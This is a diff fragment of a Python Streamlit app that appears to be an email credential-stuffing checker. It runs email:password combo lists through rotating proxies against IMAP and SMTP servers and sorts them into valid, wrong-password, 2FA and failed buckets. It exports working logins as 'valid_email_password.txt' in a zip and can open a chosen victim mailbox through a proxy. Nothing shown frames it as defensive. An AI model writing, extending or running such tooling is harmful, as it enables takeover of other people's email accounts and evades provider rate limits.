         f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
         f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
         f"retry_direct={CFG.get('RETRY_CONNECTION_FAILED')} debug={CFG.get('DEBUG')} "
-        f"test_flight={CFG.get('PROXY_TEST_FLIGHT')} allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')}"
+        f"test_flight={CFG.get('PROXY_TEST_FLIGHT')} allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
+        f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
+        f"smtp_check={CFG.get('SMTP_CHECK')} connection={CFG.get('CONNECTION_HINT')}"
     )
 
     resume_lines = []
@@ -2890,17 +3132,32 @@ if start_engine_btn:
         idx = [f"{r.get('saved_at','')} | {r.get('reason','stop')} | {r.get('checked',0)}/{r.get('total',0)}" for r in unfinished_runs].index(unfinished_pick)
         resume_lines = unfinished_runs[idx].get("remaining") or []
 
+    _label_to_key = dict(RESULT_ACTION_MODES)
+
+    def _raw_of(line):
+        return line.split("|")[0].strip()
+
     category_queue_map = {
         "Ready to Check": clean_lines, "Resume Unfinished": resume_lines, "Disposables": disp,
         "Typos": typo, "Skip previously valid": resume, "App-Skipped": app_skip,
         "Custom Filtered": custom_skipped, "DNS Failed": dns_skipped,
     }
+    if engine_action_mode in _label_to_key:
+        category_queue_map[engine_action_mode] = [
+            _raw_of(x) for x in str_lit.session_state.get(_label_to_key[engine_action_mode], [])
+        ]
+
     accounts_to_check = category_queue_map.get(engine_action_mode, [])
 
     if not accounts_to_check:
         str_lit.warning(f"⚠ No accounts found in the selected category: '{engine_action_mode}'.")
     else:
-        active_proxy_pool = get_filtered_active_proxies()
+        # Pool refresh is parallel now, and the spinner is already on screen.
+        start_alive_refresher()
+        filtered_pool[:] = get_filtered_active_proxies()
+        if not alive_pool:
+            refresh_alive_pool()
+        active_proxy_pool = list(alive_pool) or list(filtered_pool)
 
         with session_state_lock:
             str_lit.session_state.valid_results = load_persistent_valid_results()
@@ -2909,6 +3166,10 @@ if start_engine_btn:
             str_lit.session_state.wrong_results = []
             str_lit.session_state.need_app_results = []
             str_lit.session_state.conn_results = []
+            str_lit.session_state.retry_results = []
+            str_lit.session_state.smtp_results = []
+            str_lit.session_state.dns_results = []
+            str_lit.session_state.skip_results = []
             str_lit.session_state.report_entries = []
             str_lit.session_state.log_lines = []
             str_lit.session_state.checked_emails_set = set()
@@ -2920,21 +3181,55 @@ if start_engine_btn:
             str_lit.session_state.end_timestamp = None
             str_lit.session_state.total_duration = None
 
-        progress_bar = str_lit.progress(0, text=f"Initializing checking engine for [{engine_action_mode}]...")
-        status_text = str_lit.empty()
-
         exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
         with exec_tab1:
             log_container = str_lit.empty()
         with exec_tab2:
             report_metrics_placeholder = str_lit.empty()
+            bucket_placeholders = {}
+            BUCKET_SPEC = [
+                ("valid_results", "✅ Valid Accounts Found"),
+                ("wrong_results", "❌ Wrong Password Found"),
+                ("conn_results", "🔌 Connection Failed Found"),
+                ("need_app_results", "🔐 App Password / 2FA Found"),
+                ("retry_results", "🕓 RETRY_LATER Found"),
+                ("smtp_results", "📮 SMTP Failed Found"),
+                ("dns_results", "🛰 DNS Failed Found"),
+            ]
+            for _key, _title in BUCKET_SPEC:
+                with str_lit.expander(f"{_title}", expanded=False):
+                    bucket_placeholders[_key] = str_lit.empty()
             report_log_container = str_lit.empty()
 
         all_target_accounts = accounts_to_check[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check
         total_accs = len(all_target_accounts)
         checked_count = 0
         thread_local = threading.local()
-        log_cap = 200 if CFG.get("DEBUG", False) else 50
+        log_cap = 400 if CFG.get("DEBUG", False) else 120
+
+        def render_buckets(snapshot):
+            for key, title in BUCKET_SPEC:
+                ph = bucket_placeholders.get(key)
+                if ph is None:
+                    continue
+                items = snapshot.get(key) or []
+                with ph.container():
+                    if not items:
+                        str_lit.caption("nothing here yet")
+                        continue
+                    str_lit.caption(f"{len(items)} account(s)")
+                    col = TAG_COLORS.get({
+                        "valid_results": "VALID", "wrong_results": "WRONG_PASSWORD",
+                        "conn_results": "CONNECTION_FAILED", "need_app_results": "NEED_APP_PASSWORD",
+                        "retry_results": "RETRY_LATER", "smtp_results": "SMTP_FAILED",
+                        "dns_results": "DNS_FAILED",
+                    }.get(key, ""), "#cbd5e1")
+                    for ln in items[-250:]:
+                        str_lit.markdown(
+                            f"<div style='font-family:ui-monospace,monospace;font-size:12px;"
+                            f"color:{col}'>{html.escape(str(ln))}</div>",
+                            unsafe_allow_html=True,
+                        )
 
         def check_task(line):
             try:
@@ -2997,6 +3292,14 @@ if start_engine_btn:
                                     str_lit.session_state.wrong_results.append(res["line"])
                                 elif st_val == APP:
                                     str_lit.session_state.need_app_results.append(res["line"])
+                                elif st_val == RETRY:
+                                    str_lit.session_state.retry_results.append(res["line"])
+                                elif st_val == SMTP_FAILED:
+                                    str_lit.session_state.smtp_results.append(res["line"])
+                                elif st_val == DNS_FAILED:
+                                    str_lit.session_state.dns_results.append(res["line"])
+                                elif st_val == SKIP:
+                                    str_lit.session_state.skip_results.append(res["line"])
                                 else:
                                     str_lit.session_state.conn_results.append(res["line"])
 
@@ -3018,8 +3321,19 @@ if start_engine_btn:
                                 wrong_len = len(str_lit.session_state.wrong_results)
                                 need_len = len(str_lit.session_state.need_app_results)
                                 conn_len = len(str_lit.session_state.conn_results)
+                                retry_len = len(str_lit.session_state.retry_results)
+                                smtp_len = len(str_lit.session_state.smtp_results)
                                 current_logs = list(str_lit.session_state.log_lines)
                                 current_reports = list(str_lit.session_state.report_entries)
+                                bucket_snapshot = {
+                                    "valid_results": list(str_lit.session_state.valid_results),
+                                    "wrong_results": list(str_lit.session_state.wrong_results),
+                                    "conn_results": list(str_lit.session_state.conn_results),
+                                    "need_app_results": list(str_lit.session_state.need_app_results),
+                                    "retry_results": list(str_lit.session_state.retry_results),
+                                    "smtp_results": list(str_lit.session_state.smtp_results),
+                                    "dns_results": list(str_lit.session_state.dns_results),
+                                }
 
                             time.sleep(0.01)
 
@@ -3029,13 +3343,16 @@ if start_engine_btn:
                                 log_container.code("\n".join(current_logs), language="text")
 
                             with report_metrics_placeholder.container():
-                                r_col1, r_col2, r_col3, r_col4 = str_lit.columns(4)
+                                r_col1, r_col2, r_col3, r_col4, r_col5, r_col6 = str_lit.columns(6)
                                 r_col1.metric("✅ Valid", valid_len)
                                 r_col2.metric("❌ Wrong", wrong_len)
-                                r_col3.metric("🔑 AppPass", need_len)
-                                r_col4.metric("⚠ Failed", conn_len)
+                                r_col3.metric("🔑 AppPass/2FA", need_len)
+                                r_col4.metric("🔌 Conn Failed", conn_len)
+                                r_col5.metric("🕓 RETRY_LATER", retry_len)
+                                r_col6.metric("📮 SMTP Failed", smtp_len)
 
-                            report_log_container.dataframe(pd.DataFrame(current_reports[::-1]), use_container_width=True, height=300)
+                            render_buckets(bucket_snapshot)
+                            report_log_container.dataframe(pd.DataFrame(current_reports[::-1]), use_container_width=True, height=320)
 
                     except Exception as ex:
                         err_msg = f"[EXCEPTION] {str(ex)}"
@@ -3076,7 +3393,8 @@ if start_engine_btn:
                     with session_state_lock:
                         v_len = len(str_lit.session_state.valid_results)
                         w_len = len(str_lit.session_state.wrong_results)
-                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len}")
+                        rt_len = len(str_lit.session_state.retry_results)
+                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len} | RETRY_LATER: {rt_len}")
 
         except MemoryError as me:
             run_interrupted = True
@@ -3121,6 +3439,9 @@ if start_engine_btn:
             wrong_snapshot = list(str_lit.session_state.wrong_results)
             need_snapshot = list(str_lit.session_state.need_app_results)
             conn_snapshot = list(str_lit.session_state.conn_results)
+            retry_snapshot = list(str_lit.session_state.retry_results)
+            smtp_snapshot = list(str_lit.session_state.smtp_results)
+            dns_snapshot = list(str_lit.session_state.dns_results)
 
         progress_bar.progress(1.0, text="Checking complete!")
         status_text.success(f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}")
@@ -3131,6 +3452,9 @@ if start_engine_btn:
             wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
             need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
             failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
+            retry_path = os.path.join(CFG["RESULTS_DIR"], f"retry_later_{stamp}.txt")
+            smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
+            dns_path = os.path.join(CFG["RESULTS_DIR"], f"dns_failed_{stamp}.txt")
             try:
                 os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
             except OSError:
@@ -3139,7 +3463,9 @@ if start_engine_btn:
             hdr = f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n"
             with file_write_lock:
                 for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
-                                   (need_path, need_snapshot), (failed_path, conn_snapshot)):
+                                   (need_path, need_snapshot), (failed_path, conn_snapshot),
+                                   (retry_path, retry_snapshot), (smtp_path, smtp_snapshot),
+                                   (dns_path, dns_snapshot)):
                     with open(path, "w", encoding="utf-8") as f:
                         f.write(hdr)
                         f.write("\n".join(str(i) for i in snap) + ("\n" if snap else ""))
@@ -3157,8 +3483,13 @@ if start_engine_btn:
 
             zip_output_name = f"mail_results_{stamp}.zip"
             with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
-                for p, arc in ((clean_valid_path, "valid_email_password.txt"), (wrong_path, os.path.basename(wrong_path)),
-                               (need_path, os.path.basename(need_path)), (failed_path, os.path.basename(failed_path))):
+                for p, arc in ((clean_valid_path, "valid_email_password.txt"),
+                               (wrong_path, os.path.basename(wrong_path)),
+                               (need_path, os.path.basename(need_path)),
+                               (failed_path, os.path.basename(failed_path)),
+                               (retry_path, os.path.basename(retry_path)),
+                               (smtp_path, os.path.basename(smtp_path)),
+                               (dns_path, os.path.basename(dns_path))):
                     if os.path.exists(p):
                         z.write(p, arcname=arc)
 
@@ -3189,6 +3520,9 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
         wrong_len_val = len(str_lit.session_state.wrong_results)
         need_len_val = len(str_lit.session_state.need_app_results)
         conn_len_val = len(str_lit.session_state.conn_results)
+        retry_len_val = len(str_lit.session_state.retry_results)
+        smtp_len_val = len(str_lit.session_state.smtp_results)
+        dns_len_val = len(str_lit.session_state.dns_results)
         valid_res_copy = list(str_lit.session_state.valid_results)
         log_lines_copy = list(str_lit.session_state.log_lines)
         report_entries_copy = list(str_lit.session_state.report_entries)
@@ -3197,6 +3531,15 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
         start_ts_copy = str_lit.session_state.start_timestamp
         end_ts_copy = str_lit.session_state.end_timestamp
         duration_copy = str_lit.session_state.total_duration
+        summary_buckets = {
+            "✅ Valid Accounts Found": list(str_lit.session_state.valid_results),
+            "❌ Wrong Password Found": list(str_lit.session_state.wrong_results),
+            "🔌 Connection Failed Found": list(str_lit.session_state.conn_results),
+            "🔐 App Password / 2FA Found": list(str_lit.session_state.need_app_results),
+            "🕓 RETRY_LATER Found": list(str_lit.session_state.retry_results),
+            "📮 SMTP Failed Found": list(str_lit.session_state.smtp_results),
+            "🛰 DNS Failed Found": list(str_lit.session_state.dns_results),
+        }
 
     str_lit.markdown(f"### {status_label}")
 
@@ -3213,16 +3556,22 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
     if start_ts_copy and end_ts_copy:
         str_lit.info(f"⏱ **Session Timestamps:** Started **{start_ts_copy}** | Ended **{end_ts_copy}** | Duration **{duration_copy}**")
 
-    c1, c2, c3, c4 = str_lit.columns(4)
+    c1, c2, c3, c4, c5, c6 = str_lit.columns(6)
     c1.metric("✅ Clean Valid", clean_count_val)
     c2.metric("❌ Wrong Password", wrong_len_val)
     c3.metric("🔑 App Password / 2FA", need_len_val)
-    c4.metric("⚠ Connection Failed", conn_len_val)
+    c4.metric("🔌 Connection Failed", conn_len_val)
+    c5.metric("🕓 RETRY_LATER", retry_len_val)
+    c6.metric("📮 SMTP Failed", smtp_len_val)
 
-    if valid_res_copy:
-        with str_lit.expander(f"✅ Valid Accounts Found ({len(valid_res_copy)})", expanded=False):
-            for v in valid_res_copy:
-                str_lit.code(v, language="text")
+    # --- live per-status dropdowns, collapsed by default ---
+    for title, items in summary_buckets.items():
+        with str_lit.expander(f"{title} ({len(items)})", expanded=False):
+            if not items:
+                str_lit.caption("nothing here yet")
+                continue
+            for it in items:
+                str_lit.code(it, language="text")
 
     exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
     with exec_tab1_p:
@@ -3232,7 +3581,7 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
             str_lit.info("No logs available from previous run.")
     with exec_tab2_p:
         if report_entries_copy:
-            str_lit.dataframe(pd.DataFrame(report_entries_copy[::-1]), use_container_width=True, height=300)
+            str_lit.dataframe(pd.DataFrame(report_entries_copy[::-1]), use_container_width=True, height=320)
         else:
             str_lit.info("No report logs available.")
 
@@ -3271,7 +3620,7 @@ else:
                 acc_email, acc_pass = selected_combo.split(":", 1)
                 acc_email, acc_pass = acc_email.strip(), acc_pass.strip()
                 imap_hosts = get_servers(acc_email).get("imap", [])
-                mailbox_proxy = sample_alive_proxy() if use_proxy else None
+                mailbox_proxy = sample_alive_proxy(domain=acc_email.split("@")[-1]) if use_proxy else None
 
                 if not imap_hosts:
                     str_lit.error("No IMAP host available for this provider domain name.")
